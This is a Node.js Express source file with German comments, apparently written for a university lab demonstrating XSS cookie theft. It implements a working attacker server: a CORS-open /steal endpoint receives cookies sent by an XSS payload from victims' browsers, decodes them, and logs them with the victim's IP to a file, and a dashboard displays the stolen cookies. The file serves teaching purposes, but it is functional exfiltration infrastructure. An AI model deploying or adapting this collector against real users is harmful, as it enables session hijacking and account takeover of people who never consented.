const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();
const PORT = 4000;

// -------------------------------------------------------
// Optionaler Basic-Auth-Schutz fürs Dashboard
// Wird nur aktiviert wenn DEMO_PASSWORD gesetzt ist.
// /steal bleibt absichtlich offen – wird vom XSS-Payload
// im Browser des Opfers aufgerufen und kann keine
// Credentials mitsenden.
// -------------------------------------------------------
const DEMO_PASSWORD = process.env.DEMO_PASSWORD;
function requireAuth(req, res, next) {
  if (!DEMO_PASSWORD) return next(); // kein Passwort gesetzt → offen
  const auth = req.headers['authorization'] || '';
  const encoded = auth.startsWith('Basic ') ? auth.slice(6) : '';
  const decoded = Buffer.from(encoded, 'base64').toString('utf8');
  const [, pass] = decoded.split(':');
  if (pass === DEMO_PASSWORD) return next();
  res.setHeader('WWW-Authenticate', 'Basic realm="Angreifer-Dashboard"');
  res.status(401).send('Authentifizierung erforderlich');
}

const STOLEN_COOKIES_FILE = path.join(__dirname, 'stolen_cookies.txt');

// Ensure the file exists
if (!fs.existsSync(STOLEN_COOKIES_FILE)) {
  fs.writeFileSync(STOLEN_COOKIES_FILE, '=== Gestohlene Cookies – Labor 8 Angreifer-Server ===\n\n');
}

// -------------------------------------------------------
// GET /steal?cookie=<value>
// This endpoint is called by the XSS payload running in
// the victim's browser.  It logs the stolen cookie to
// the console and to a persistent file.
// -------------------------------------------------------
app.get('/steal', (req, res) => {
  // Allow cross-origin requests so the browser does not block the request
  res.setHeader('Access-Control-Allow-Origin', '*');

  const rawCookie = req.query.cookie || '';
  const clientIP   = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unbekannt';
  const timestamp  = new Date().toLocaleString('de-CH');

  // The payload may base64-encode the cookie – try to decode it
  let decoded = rawCookie;
  try {
    const buf = Buffer.from(rawCookie, 'base64');
    // Only use the decoded value if it looks like printable text
    if (/^[\x20-\x7E]+$/.test(buf.toString('utf8'))) {
      decoded = buf.toString('utf8');
    }
  } catch (_) {
    // not base64 – use as-is
  }

  const logEntry =
    `[${timestamp}] IP: ${clientIP}\n` +
    `  Raw:     ${rawCookie}\n` +
    `  Decoded: ${decoded}\n` +
    `${'─'.repeat(60)}\n`;

  console.log('\n[ANGREIFER] *** COOKIE GESTOHLEN ***');
  console.log(logEntry);

  // Append to file
  fs.appendFileSync(STOLEN_COOKIES_FILE, logEntry);

  // Send a 1x1 transparent GIF so the browser does not show an error
  // (alternative to document.location redirect, works with fetch() too)
  const transparentGif = Buffer.from(
    'R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7',
    'base64'
  );
  res.writeHead(200, { 'Content-Type': 'image/gif' });
  res.end(transparentGif);
});

// -------------------------------------------------------
// GET / – simple dashboard showing all stolen cookies
// -------------------------------------------------------
app.get('/', requireAuth, (req, res) => {
  let fileContent = '';
  try {
    fileContent = fs.readFileSync(STOLEN_COOKIES_FILE, 'utf8');
  } catch (_) {
    fileContent = '(keine Datei vorhanden)';
  }

  // Escape HTML for safe display in the dashboard
  const escaped = fileContent
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');

  res.send(`
<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="5">
  <title>Angreifer-Server – Gestohlene Cookies</title>
  <style>
    body { font-family: monospace; max-width: 900px; margin: 40px auto; padding: 0 20px; background: #1a1a2e; color: #eee; }
    h1 { color: #e94560; }
    .subtitle { color: #aaa; font-size: 0.9em; margin-top: -10px; }
    pre { background: #16213e; border: 1px solid #e94560; padding: 20px; border-radius: 6px; overflow-x: auto; white-space: pre-wrap; word-break: break-all; line-height: 1.6; }
    .info { background: #0f3460; border: 1px solid #533483; padding: 12px; border-radius: 4px; margin-bottom: 20px; font-size: 0.85em; }
    .refresh { color: #888; font-size: 0.8em; }
  </style>
</head>
<body>
  <h1>Angreifer-Server</h1>
  <p class="subtitle">Labor 8 – Verteilte Systeme | XSS Cookie-Theft Demo</p>

  <div class="info">
    Wartet auf eingehende Cookies via <code>GET /steal?cookie=&lt;wert&gt;</code><br>
    Seite wird automatisch alle 5 Sekunden aktualisiert.
    <span class="refresh">(Auto-Refresh aktiv)</span>
  </div>

  <h2>Protokoll (${STOLEN_COOKIES_FILE})</h2>
  <pre>${escaped || '(noch keine Cookies empfangen)'}</pre>
</body>
</html>
  `);
});

// -------------------------------------------------------
// GET /clear – reset the stolen cookies file (for demos)
// -------------------------------------------------------
app.get('/clear', requireAuth, (req, res) => {
  fs.writeFileSync(STOLEN_COOKIES_FILE, '=== Gestohlene Cookies – Labor 8 Angreifer-Server ===\n\n');
  console.log('[ANGREIFER] Protokoll gelöscht.');
  res.redirect('/');
});

app.listen(PORT, () => {
  console.log(`[Angreifer-Server] läuft auf http://localhost:${PORT}`);
  console.log(`[Angreifer-Server] Cookie-Endpunkt: http://localhost:${PORT}/steal?cookie=<wert>`);
  console.log(`[Angreifer-Server] Protokolldatei: ${STOLEN_COOKIES_FILE}`);
});
